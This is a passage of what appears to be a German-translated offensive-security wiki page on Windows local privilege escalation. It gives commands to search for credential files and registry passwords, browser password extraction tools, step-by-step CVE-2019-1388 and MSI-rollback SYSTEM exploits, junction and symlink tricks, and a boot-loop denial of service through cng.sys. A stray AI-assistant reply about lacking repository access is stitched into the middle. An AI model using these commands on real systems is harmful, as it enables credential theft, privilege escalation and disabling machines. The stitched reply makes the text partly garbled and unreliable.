php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ich habe keinen Zugriff auf dein Repository. Bitte sende den Inhalt von src/windows-hardening/windows-local-privilege-escalation/README.md (oder alle vorgeschlagenen Dateien), die ich durchsuchen/übersetzen soll.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Überprüfe außerdem den Bin, um darin nach Credentials zu suchen

Um **Passwörter wiederherzustellen**, die von mehreren Programmen gespeichert wurden, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Andere mögliche Registry-Schlüssel mit Credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Du solltest nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\  
Prüfe auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine innerhalb des Windows-Betriebssystems integrierte Technologie, die die **Interkommunikation** zwischen Softwarekomponenten unterschiedlicher Sprachen ermöglicht. Jede COM-Komponente ist **identified via a class ID (CLSID)** und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, identifiziert via interface IDs (IIDs).

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** zusammengeführt werden = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Grundsätzlich, wenn du eine der **DLLs** überschreiben kannst, die ausgeführt werden sollen, könntest du **escalate privileges**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu sehen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und der Registry**

**Dateiinhalte durchsuchen**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Nach einer Datei mit einem bestimmten Dateinamen suchen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Die Registry nach Schlüsselnamen und Passwörtern durchsuchen**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** Plugin. Ich habe dieses Plugin erstellt, um **automatically execute every metasploit POST module that searches for credentials** im Opfer auszuführen.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die passwords enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um password aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im clear text speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess öffnet** (`OpenProcess()`) mit **vollen Zugriffsrechten**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du das **geöffnete Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde, übernehmen** und **einen Shellcode injizieren**.\
[Lies dieses Beispiel für mehr Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Lies diesen **anderen Beitrag für eine ausführlichere Erklärung, wie man mehr offene Handler von Prozessen und Threads testet und ausnutzt, die mit unterschiedlichen Berechtigungsstufen geerbt wurden (nicht nur voller Zugriff)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speichersegmente, bezeichnet als **pipes**, ermöglichen die Kommunikation und den Datenaustausch zwischen Prozessen.

Windows bietet die Funktion **Named Pipes**, die es nicht zusammenhängenden Prozessen ermöglicht, Daten zu teilen, sogar über verschiedene Netzwerke. Das ähnelt einer Client-/Server-Architektur, mit den Rollen **named pipe server** und **named pipe client**.

Wenn Daten von einem **client** über eine Pipe gesendet werden, hat der **server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität des clients anzunehmen**, sofern er die notwendigen **SeImpersonate**-Rechte besitzt. Das Erkennen eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet die Gelegenheit, **höhere Privilegien zu erlangen**, indem du die Identität dieses Prozesses übernimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Zusätzlich erlaubt das folgende Tool, eine named pipe-Kommunikation mit einem Tool wie burp **abzufangen**: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt, alle Pipes aufzulisten und anzusehen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Servermodus exponiert `\\pipe\\tapsrv` (MS-TRP). Ein remote authentifizierter Client kann den mailslot-basierten asynchronen Event-Pfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf eine vorhandene Datei umzuwandeln, die von `NETWORK SERVICE` beschreibbar ist, anschließend Telephony-Administrationsrechte zu erlangen und eine beliebige DLL als Dienst zu laden. Gesamtablauf:

- `ClientAttach` mit `pszDomainUser` auf einen existierenden, beschreibbaren Pfad gesetzt → der Dienst öffnet ihn via `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Event-Schreibvorgänge.
- Jedes Event schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` (`Req_Func 121`) aus, hole sie mit `GetAsyncEvents` (`Req_Func 0`) ab, und deregistriere/fahre herunter, um deterministische Schreibvorgänge zu wiederholen.
- Füge dich zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, verbinde neu, rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Verschiedenes

### File Extensions that could execute stuff in Windows

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn man eine Shell als Benutzer erhält, können geplante Tasks oder andere Prozesse ausgeführt werden, die **Anmeldeinformationen in der Kommandozeile übergeben**. Das untenstehende Skript erfasst Prozess-Kommandozeilen alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es alle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen beliebigen anderen Prozess wie "NT\AUTHORITY SYSTEM" als unprivilegierter Benutzer zu starten.

Das macht es möglich, Privilegien zu eskalieren und gleichzeitig UAC mit derselben Schwachstelle zu umgehen. Außerdem muss nichts installiert werden und die während des Vorgangs verwendete Binary ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Vom Administrator Medium zu High Integrity Level / UAC Bypass

Lies dies, um mehr über Integritätsstufen zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies dann dies, um mehr über UAC und UAC-Bypässe zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von beliebiger Ordnerlöschung/-verschiebung/-umbenennung zu SYSTEM EoP

Die Technik, die [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben wird, mit einem Exploit-Code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion des Windows Installers auszunutzen, um legitime Dateien während des Deinstallationsvorgangs durch bösartige zu ersetzen. Dafür muss der Angreifer einen **bösartigen MSI-Installer** erstellen, der dazu verwendet wird, den `C:\Config.Msi`-Ordner zu kapern, der später vom Windows Installer verwendet wird, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so modifiziert werden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik ist wie folgt:

1. Phase 1 – Vorbereitung für den Hijack (lasse `C:\Config.Msi` leer)

- Step 1: Install the MSI
- Erstelle ein `.msi`, das eine harmlose Datei installiert (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`).
- Markiere den Installer als **"UAC Compliant"**, damit ein **nicht-administrativer Benutzer** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Step 2: Begin Uninstall
- Deinstalliere dasselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien umzubenennen (Rollback-Backups).
- **Poll the open file handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Custom Syncing
- Das `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- Signalisiert, wenn `.rbf` geschrieben wurde.
- Dann auf ein anderes Event **wartet**, bevor die Deinstallation fortgesetzt wird.

- Step 4: Block Deletion of `.rbf`
- Wenn signalisiert wurde, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch wird das **Löschen verhindert**.
- Dann **signalisiere zurück**, damit die Deinstallation fertig werden kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und da nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Step 5: Manually Delete `.rbf`
- Du (Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit für die Übernahme.

> An diesem Punkt **trigger** die SYSTEM-level arbitrary folder delete Schwachstelle, um `C:\Config.Msi` zu löschen.

2. Phase 2 – Ersetzen der Rollback-Skripte durch bösartige

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F) und **halte einen Handle offen** mit `WRITE_DAC`.

- Step 7: Run Another Install
- Installiere das `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird dazu verwendet, erneut einen **Rollback** auszulösen, der `.rbs` und `.rbf` liest.

- Step 8: Monitor for `.rbs`
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse deren Dateinamen.

- Step 9: Sync Before Rollback
- Das `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- Ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- Dann **wartet**, bevor sie fortfährt.

- Step 10: Reapply Weak ACL
- Nachdem das `rbs created`-Event empfangen wurde:
- Der Windows Installer **wendet starke ACLs erneut an** auf `C:\Config.Msi`.
- Aber da du noch einen Handle mit `WRITE_DAC` offen hast, kannst du **erneut schwache ACLs** anwenden.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- Deine `.rbf`-Datei (bösartige DLL) in einen **privilegierten Pfad** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` ab, die eine **bösartige SYSTEM-Level Payload-DLL** enthält.

- Step 12: Trigger the Rollback
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass die Installation **absichtlich an einem bekannten Punkt fehlschlägt**.
- Das verursacht den Beginn des **Rollback**.

- Step 13: SYSTEM Installs Your DLL
- Der Windows Installer:
- Liest deine bösartige `.rbs`.
- Kopiert deine `.rbf`-DLL in den Zielort.
- Du hast nun deine **bösartige DLL in einem SYSTEM-geladenen Pfad**.

- Final Step: Execute SYSTEM Code
- Führe ein vertrauenswürdiges **auto-elevated binary** aus (z. B. `osk.exe`), das die von dir gehijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebiger Datei-Löschung/-Verschiebung/-Umbenennung zu SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Schwachstelle nur **beliebiges Löschen von Dateien** erlaubt?

Du könntest die **NTFS-Interna** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den `::$INDEX_ALLOCATION`-Stream eines Ordners löschst, entfernt NTFS den gesamten Ordner vom Dateisystem.

Das kannst du mit standardmäßigen Dateilöschungs-APIs wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, löscht sie **den Ordner selbst**.

### Von Folder Contents Delete zu SYSTEM EoP
Was, wenn dein Primitiv es nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber es **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Lege einen Köderordner und eine Datei an
- Erstelle: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Setze ein **oplock** auf `file1.txt`
- Das oplock **unterbricht die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn es `file1.txt` erreicht, **oplock löst aus** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock-Callbacks – die Löschung umleiten

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Damit wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: Konvertiere `folder1` in eine **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert — das Löschen davon löscht den Ordner.

5. Schritt 5: oplock freigeben
- Der SYSTEM-Prozess fährt fort und versucht, `file1.txt` zu löschen.
- Aber jetzt löscht es aufgrund der junction + symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von beliebiger Ordnererstellung zu dauerhaftem DoS

Missbrauche ein Primitiv, das es dir erlaubt, **einen beliebigen Ordner als SYSTEM/admin zu erstellen** — selbst wenn **du keine Dateien schreiben kannst** oder **keine schwachen Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (nicht eine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner erstellen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Dann versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es sieht den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder stoppt den Bootvorgang**.
- Es gibt **keinen Fallback**, und **keine Wiederherstellung** ohne externe Intervention (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu beliebigem Dateiüberschreiben / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Die Konfiguration, die den Zielpfad speichert, ist für den Angreifer schreibbar (z. B. `%ProgramData%\...\.ini`).
- Fähigkeit, einen Mount-Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Report).

**Example chain**
1. Lese die Konfiguration, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte darauf, dass die privilegierte Komponente das Log schreibt (z. B. Admin löst "Test-SMS senden" aus). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Korruption zu bestätigen; ein Reboot zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei verallgemeinern, die ein privilegierter Service zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann diese zuerst versucht werden, wodurch es zu einer verlässlichen DoS-Senke für korrupte Daten wird.



## **Von hoher Integrität zu SYSTEM**

### **Neuer Service**

Wenn Sie bereits in einem Prozess mit hoher Integrität laufen, kann der **Weg zu SYSTEM** einfach sein, indem Sie **einen neuen Service erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wenn Sie ein Service-Binary erstellen, stellen Sie sicher, dass es ein gültiger Service ist oder dass das Binary die notwendigen Aktionen schnell genug ausführt, da es sonst nach 20s beendet wird.

### AlwaysInstallElevated

Von einem High Integrity-Prozess aus können Sie versuchen, die AlwaysInstallElevated-Registry-Einträge zu aktivieren und eine Reverse-Shell mit einem _**.msi**_ Wrapper zu installieren.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Sie können** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn Sie diese Token-Privilegien haben (wahrscheinlich finden Sie diese bereits in einem High Integrity-Prozess), können Sie fast jeden Prozess (keine protected processes) mit dem SeDebug-Privileg öffnen, das Token des Prozesses kopieren und einen beliebigen Prozess mit diesem Token erstellen.\
Bei dieser Technik wählt man normalerweise einen Prozess, der als SYSTEM läuft und alle Token-Privilegien besitzt (_ja, Sie können SYSTEM-Prozesse finden, die nicht alle Token-Privilegien haben_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/auszunutzen, der in diese Pipe schreibt**. Danach kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, das Token des Pipe-Clients (des Services) **impersonate** und so SYSTEM-Privilegien erlangen.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es Ihnen gelingt, eine **dll zu hijacken**, die von einem **Prozess** geladen wird, der als **SYSTEM** läuft, können Sie beliebigen Code mit diesen Rechten ausführen. Dll Hijacking ist daher auch für diese Art der Privilege Escalation nützlich und darüber hinaus viel **leichter von einem high integrity process** zu erreichen, da dieser **Schreibrechte** auf die Ordner hat, die zum Laden von dlls verwendet werden.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

Lesen: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool, um nach Windows local privilege escalation-Vektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensitive Dateien (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf einige mögliche Fehlkonfigurationen und sammelt Informationen (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert PuTTY-, WinSCP-, SuperPuTTY-, FileZilla- und RDP-gespeicherte Session-Informationen. Verwenden Sie lokal -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Credentials aus dem Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprayt gesammelte Passwörter im gesamten Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basis privesc Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten privesc-Schwachstellen (DEPRECATED für Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Benötigt Admin-Rechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
